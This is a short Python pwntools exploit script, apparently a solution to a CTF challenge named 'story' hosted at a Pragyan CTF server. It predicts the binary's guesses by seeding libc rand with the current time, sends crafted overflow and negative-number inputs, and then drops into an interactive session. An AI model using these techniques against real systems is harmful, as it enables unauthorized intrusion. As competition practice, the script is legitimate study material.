from pwn import *
import time
from ctypes import CDLL
from ctypes.util import find_library

context.log_level = 'debug'
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./story"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("story.ctf.pragyan.org", 6004)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


s = int(int(time.time()) / 60)
libc = CDLL(find_library("c"))

libc.srand(s)

random = []
for i in range(4):
    random.append(libc.rand() % 1000)

print(random)
for i in random:
    io.sendlineafter("Enter your guess: ", str(i))

io.sendlineafter("Write a few words about the game ", b"a" * 12 + b"L")
io.sendlineafter("must be less than 1000: ", b"-12 -211")

io.interactive()
